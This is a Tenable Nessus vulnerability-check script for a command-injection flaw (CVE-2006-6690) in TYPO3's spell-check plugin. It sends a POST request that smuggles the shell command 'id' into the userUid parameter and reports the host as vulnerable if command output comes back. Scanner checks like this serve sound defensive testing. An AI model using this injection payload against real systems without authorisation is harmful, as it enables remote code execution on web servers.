#
# (C) Tenable Network Security
#

include("compat.inc");

if (description)
{
  script_id(23933);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-6690");
  script_bugtraq_id(21680);
  script_xref(name:"OSVDB", value:"30890");

  script_name(english:"TYPO3 spell-check-logic.php userUid Parameter Arbitrary Command Execution");
  script_summary(english:"Tries to run a command via TYPO3");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows arbitrary
command execution." );
 script_set_attribute(attribute:"description", value:
"The remote host is running TYPO3, an open-source content management
system written in PHP. 

The version of TYPO3 installed on the remote host fails to sanitize
user-supplied input to the 'userUid' parameter before using it in the
'spell-check-logic.php' script to execute a command.  An
unauthenticated remote attacker can leverage this flaw to execute
arbitrary code on the remote host subject to the privileges of the web
server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/454944/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://lists.netfielders.de/pipermail/typo3-dev/2006-December/021455.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to TYPO3 version 4.0.4 / 4.1beta2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/cms", "/typo3", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  foreach subdir (make_list("sysext", "ext"))
  {
    # Check whether the affected script exists.
    url = string(dir, "/typo3/", subdir, "/rtehtmlarea/htmlarea/plugins/SpellChecker/spell-check-logic.php");
    w = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # If it does...
    if ("var spellcheck_info" >< res)
    {
      cmd = "id";
      exploit = 
      postdata = string(
        "psell_mode=fast&",
        "to_p_dict=1&",
        "cmd=learn&",
        "userUid=", urlencode(str:"test; id #"), "&",
        "enablePersonalDicts=true"
      );
      w = http_send_recv3(method:"POST ", item: url+"?id=1", port: port,
      	content_type: "application/x-www-form-urlencoded",
	data: postdata );
      if (isnull(w)) exit(1, "the web server did not answer");
      res = w[2];

      # There's a problem if we see output from our command.
      line = egrep(pattern:"uid=[0-9]+.*gid=[0-9]+.*", string:res);
      if (line)
      {
        if (report_verbosity)
        {
          report = string(
            "\n",
            "Nessus was able to execute the command '", cmd, "' on the remote host.\n",
            "It produced the following output :\n",
            "\n",
            "  ", line
          );
          security_hole(port:port, extra:report);
        }
        else security_hole(port);
        exit(0);
      }
    }
  }
}
